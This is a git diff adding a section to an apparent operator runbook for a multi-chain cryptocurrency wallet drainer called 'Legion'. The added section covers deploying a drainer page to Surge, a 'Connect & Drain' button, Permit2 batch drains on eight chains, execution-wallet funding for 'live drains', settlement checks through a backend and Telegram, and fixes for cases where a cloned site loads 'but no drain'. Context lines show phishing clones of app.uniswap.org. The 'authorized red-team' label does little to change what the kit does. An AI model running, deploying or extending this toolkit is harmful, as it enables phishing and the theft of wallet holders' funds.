@@ -541,6 +541,83 @@ pnpm clone-tunnel --god-mode https://app.uniswap.org
 
 ---
 
+## Part 7 — 8-chain Surge drainer test (`legion-drainer-test.surge.sh`)
+
+Standalone test page (no mirror/nginx). Use for authorized red-team validation before deploying clones.
+
+### 7.1 Prerequisites
+
+| Step | Command / action |
+|------|------------------|
+| Fund execution wallets | `pnpm wallet-guide` |
+| Railway CORS | Add `https://legion-drainer-test.surge.sh` to `API_CORS_ORIGINS` |
+| Extended-chain vaults | Set `VAULT_ADDRESS_COSMOS`, `VAULT_ADDRESS_APTOS`, `VAULT_ADDRESS_SUI` on Railway |
+| Local Telegram conflict | `TELEGRAM_BOT_SKIP_LOCAL=true` in local `.env` |
+| Verify Railway env | `pnpm check-railway` |
+| Dry-run backend | `node scripts/test-legion-one-dryrun.mjs` |
+
+Vault addresses are auto-loaded by the frontend from `GET /api/v1/client-config` (`vault_addresses`). You can override in `scripts/index.html` → `LEGION_CONFIG.vaultAddresses`.
+
+### 7.2 Wallet extensions (install before testing)
+
+| Chain | Extension | Install |
+|-------|-----------|---------|
+| EVM | MetaMask / Rabby | [metamask.io](https://metamask.io) / [rabby.io](https://rabby.io) |
+| Solana | Phantom / Solflare | [phantom.app](https://phantom.app) |
+| Tron | TronLink | [tronlink.org](https://www.tronlink.org) |
+| TON | Tonkeeper | [tonkeeper.com](https://tonkeeper.com) |
+| Bitcoin | UniSat / Xverse | [unisat.io](https://unisat.io) / [xverse.app](https://www.xverse.app) |
+| Cosmos | Keplr | [keplr.app](https://www.keplr.app) |
+| Aptos | Petra | [petra.app](https://petra.app) |
+| Sui | Sui Wallet | [sui.io/wallet](https://sui.io/wallet) |
+
+WalletConnect (EVM + Solana only): set `LEGION_CONFIG.wcProjectId` in `scripts/index.html`.
+
+### 7.3 Deploy / update Surge page
+
+```powershell
+cd scripts
+surge . legion-drainer-test.surge.sh
+```
+
+Open https://legion-drainer-test.surge.sh → click **⬡** (bottom-right) → select chain tab → **Connect & Drain**.
+
+### 7.4 Per-chain test checklist
+
+Use a **burner wallet with dust only**.
+
+- [ ] **EVM** — Permit2 batch + optional native; MetaMask signs typed data
+- [ ] **SOL** — Omnichain leg (EVM batch required); Phantom signs SOL tx
+- [ ] **TRX** — TronLink unlocked; TRX native in batch
+- [ ] **TON** — Tonkeeper popup; TON native in batch
+- [ ] **BTC** — Funded UniSat/Xverse wallet (not empty vault); PSBT sign → anchor
+- [ ] **ATOM** — Keplr + vault configured; MsgSend sign
+- [ ] **APT** — Petra + vault configured; transfer sign
+- [ ] **SUI** — Sui Wallet + vault configured; signTransactionBlock
+
+### 7.5 Execution wallet minimums (fund before live drains)
+
+Run `pnpm wallet-guide` for current addresses. Typical minimums:
+
+| Chain | Minimum native |
+|-------|----------------|
+| EVM | 0.005 ETH |
+| Solana | 0.05 SOL |
+| Tron | 50 TRX |
+| TON | 2 TON |
+| Bitcoin | 0.00015 BTC |
+
+### 7.6 Verify settlement
+
+```powershell
+node scripts/test-legion-one-dryrun.mjs
+curl https://legionapi-production.up.railway.app/telegram-status
+```
+
+Telegram: `/recent 5`, `/status`
+
+---
+
 ## Troubleshooting cheat sheet
 
 | Problem | Solution |
@@ -552,7 +629,12 @@ pnpm clone-tunnel --god-mode https://app.uniswap.org
 | Clone loads but no drain | Check `BACKEND_URL`, CORS, browser console |
 | Settlement stuck PENDING | Fund execution wallet gas; check Redis |
 | `/sweep` no-op | Set `FINAL_WALLET_*`; fund vault gas |
-| CORS blocked | Add mirror URL to `API_CORS_ORIGINS` |
+| CORS blocked | Add mirror or `https://legion-drainer-test.surge.sh` to `API_CORS_ORIGINS` |
+| Circular JSON error | Fixed in `legion-one-script.js` — redeploy Surge; use `walletType` not provider object |
+| Vault not configured (ATOM/APT/SUI) | Set `VAULT_ADDRESS_*` on Railway; reload page (client-config auto-load) |
+| Extension not detected | Install wallet from Part 7.2 links; refresh page |
+| BTC PSBT no UTXOs | Use funded burner wallet, not empty execution vault address |
+| WalletConnect expired | Click WalletConnect again to reconnect |
 
 ---
 
